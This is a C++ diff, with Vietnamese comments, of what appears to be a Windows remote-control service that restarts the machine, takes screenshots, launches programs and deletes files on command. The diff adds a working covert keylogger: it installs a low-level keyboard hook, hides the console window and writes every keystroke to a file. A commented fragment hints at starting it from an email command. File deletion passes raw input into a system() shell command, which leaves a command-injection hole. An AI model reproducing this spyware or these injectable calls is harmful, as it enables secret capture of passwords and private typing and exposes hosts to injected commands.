@@ -38,7 +38,10 @@ bool Services::restartComputer(const std::string &saveFile) {
     return system("shutdown /r /f /t 10") == 0;
 }
 
-bool Services::SpecialKeys(int S_Key, std::string &logData) {
+std::mutex logMutex;  // Mutex để bảo vệ truy cập tới logData  
+std::string logData;
+
+bool Services::SpecialKeys(int S_Key) {
     switch (S_Key)
     {
     case VK_SPACE:
@@ -233,31 +236,97 @@ bool Services::SpecialKeys(int S_Key, std::string &logData) {
     }
 }
 
-bool Services::keyLogger(const std::string &saveFile) {
-    std::ofstream fout(saveFile.c_str());
-    if (!fout.is_open()) {
-        return false;
-    }
+// bool Services::keyLogger(const std::string &saveFile) {
+//     std::ofstream fout(saveFile.c_str());
+//     if (!fout.is_open()) {
+//         return false;
+//     }
 
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    std::string logData = "";
-    bool flag = 1;
-    while (flag) {
-        Sleep(10);
-        for (int k = 8; k <= 256; k++) {
-            if (GetAsyncKeyState(k) == -32767) {
-                if (k == VK_ESCAPE) {
-                    flag = 0;
-                    break;
-                }
-                if (!SpecialKeys(k, logData))
-                    fout << char(k);
-            }
-        }
-    }
+//     ShowWindow(GetConsoleWindow(), SW_HIDE);
+//     std::string logData = "";
+//     bool flag = 1;
+//     // std::string emailBody = getEmail();
+//     // if (emailBody == "start keylogger")
+//     // {
+//     //     ...
+//     // }
+//     while (flag) {
+//         Sleep(10);
+//         for (int k = 8; k <= 256; k++) {
+//             if (GetAsyncKeyState(k) == -32767) {
+//                 if (k == VK_ESCAPE) {
+//                     flag = 0;
+//                     break;
+//                 }
+//                 if (!SpecialKeys(k, logData))
+//                     logData += char(k);
+//             }
+//         }
+//         if (!logData.empty()) {  
+//             fout << logData; 
+//             logData.clear();  
+//         }  
+//     }
     
-    fout.close();
-    return true;
+//     fout.close();
+//     return true;
+// }
+
+// Hàm hook cho bàn phím  
+LRESULT CALLBACK Services::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {  
+    if (nCode == HC_ACTION) {  
+        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;  
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {  
+            if (kbd->vkCode == VK_ESCAPE) {  
+                return 0;   
+            }  
+
+            // Nếu là phím đặc biệt  
+            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
+            if (!SpecialKeys(kbd->vkCode)) {  
+                logData += char(kbd->vkCode); 
+            }  
+        }  
+    }  
+    return CallNextHookEx(NULL, nCode, wParam, lParam);  
+}  
+
+bool Services::keyLogger(const std::string &saveFile) {  
+    std::ofstream fout(saveFile.c_str());  
+    if (!fout.is_open()) {  
+        return false;  
+    }  
+
+    ShowWindow(GetConsoleWindow(), SW_HIDE);  
+
+    // Thiết lập hook bàn phím  
+    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);  
+    if (!hook) {  
+        fout.close();  
+        return false;  
+    }  
+
+    MSG msg;  
+    while (true) {  
+        {  
+            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
+            if (!logData.empty()) {  
+                fout << logData;  
+                logData.clear();  
+            }  
+        }  
+        if (GetAsyncKeyState(VK_ESCAPE)) {  
+            break;
+        } 
+        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {  
+            TranslateMessage(&msg);  
+            DispatchMessage(&msg);  
+        }  
+    }  
+
+    UnhookWindowsHookEx(hook);  
+    fout.close();  
+    return true;  
 }
 
 bool Services::isSystemApp(const std::string &windowTitle, const std::string &executableName) {
@@ -322,7 +391,7 @@ bool Services::listApplications(const std::string &saveFile) {
         return false;
     }
 
-    fout << "Cac ung dung dang chay:\n";
+    fout << "Cac ung dung dang chay:\n\n";
     for (const auto &app : runningApps) {
         fout << "Process ID: " << app.processID
              << "\nTieu de cua so: " << app.windowTitle
@@ -346,21 +415,71 @@ bool Services::getApplicationPathFromSearch(const std::string &appName, std::str
     return false;
 }
 
-bool Services::startApplication(const std::string &appName) {
-    std::string appPath;
+// bool Services::startApplication(const std::string &appName) {
+//     std::string appPath;
 
-    // Tìm kiếm ứng dụng bằng tên
-    if (getApplicationPathFromSearch(appName, appPath)) {
-        // Nếu tìm thấy đường dẫn ứng dụng
-        std::string command = "start \"\" \"" + appPath + "\"";
-        std::cout << "Starting application: " << appName << '\n';
-        return system(command.c_str());
-    }
-    else {
-        std::cout << "Application " << appName << " not found" << '\n';
-        return false;
-    }
-}
+//     // Tìm kiếm ứng dụng bằng tên
+//     if (getApplicationPathFromSearch(appName, appPath)) {
+//         // Nếu tìm thấy đường dẫn ứng dụng
+//         std::string command = "start \"\" \"" + appPath + "\"";
+//         std::cout << "Starting application: " << appName << '\n';
+//         return system(command.c_str());
+//     }
+//     else {
+//         std::cout << "Application " << appName << " not found" << '\n';
+//         return false;
+//     }
+// }
+
+// namespace fs = std::filesystem;  
+
+// bool Services::getApplicationPathFromSearch(const std::string &appName, std::string &appPath) {  
+//     // Nếu bạn không muốn sử dụng FindExecutableA, bạn có thể sử dụng filesystem  
+//     for (const auto& dir : {"C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows\\System32"}) {  
+//         for (const auto& entry : fs::directory_iterator(dir)) {  
+//             if (entry.path().filename() == appName) {  
+//                 appPath = entry.path().string();  
+//                 return true;  
+//             }  
+//         }  
+//     }  
+//     return false;  
+// }  
+
+bool Services::startApplication(const std::string &appName) {  
+    std::string appPath;  
+
+    // Tìm kiếm ứng dụng bằng tên  
+    if (getApplicationPathFromSearch(appName, appPath)) {  
+        // Nếu tìm thấy đường dẫn ứng dụng  
+        std::cout << "Starting application: " << appName << '\n';  
+
+        // Thiết lập cấu trúc STARTUPINFO và PROCESS_INFORMATION  
+        STARTUPINFO si;  
+        PROCESS_INFORMATION pi;  
+        ZeroMemory(&si, sizeof(si));  
+        si.cb = sizeof(si);  
+        ZeroMemory(&pi, sizeof(pi));  
+
+        // Tạo tiến trình  
+        if (!CreateProcess(appPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {  
+            std::cerr << "CreateProcess failed: " << GetLastError() << '\n';  
+            return false;  
+        }  
+
+        // Đợi cho tiến trình hoàn thành (tuỳ chọn)  
+        // WaitForSingleObject(pi.hProcess, INFINITE);  
+
+        // Đóng handle vì chúng ta không sử dụng nữa  
+        CloseHandle(pi.hProcess);  
+        CloseHandle(pi.hThread);  
+
+        return true;  
+    } else {  
+        std::cout << "Application " << appName << " not found" << '\n';  
+        return false;  
+    }  
+}  
 
 bool Services::isApplicationRunning(const std::string &appName) {
     std::string processName = extractAppName(appName);
@@ -643,10 +762,10 @@ bool Services::takeScreenShot(const std::string &filename) {
     return CaptureScreen(filename);
 }
 
-bool Services::copyFile(const std::string &fileSrc, const std::string &fileDes) {
-    std::string command = "copy " + fileSrc + " " + fileDes;
-    return system(command.c_str()) == 0;
-}
+// bool Services::copyFile(const std::string &fileSrc, const std::string &fileDes) {
+//     std::string command = "copy " + fileSrc + " " + fileDes;
+//     return system(command.c_str()) == 0;
+// }
 
 bool Services::deleteFile(const std::string &fileName) {
     std::string command = "del \"" + fileName + "\"";
@@ -682,12 +801,12 @@ bool Services::processCommand(std::string &command) {
     std::string type = command.substr(0, pos);
     std::cout << "Type: " << type << '\n';
 
-    if (type == "file-copy") {
-        int pos2 = command.find(' ', pos + 1);
-        std::string pathSrc = command.substr(pos + 1, pos2 - pos - 1);
-        std::string pathDes = command.substr(pos2 + 1, command.size() - pos2 - 1);
-        return copyFile(pathSrc, pathDes);
-    }
+    // if (type == "file-copy") {
+    //     int pos2 = command.find(' ', pos + 1);
+    //     std::string pathSrc = command.substr(pos + 1, pos2 - pos - 1);
+    //     std::string pathDes = command.substr(pos2 + 1, command.size() - pos2 - 1);
+    //     return copyFile(pathSrc, pathDes);
+    // }
 
     if (servicesMap.find(type) == servicesMap.end()) {
         return false;
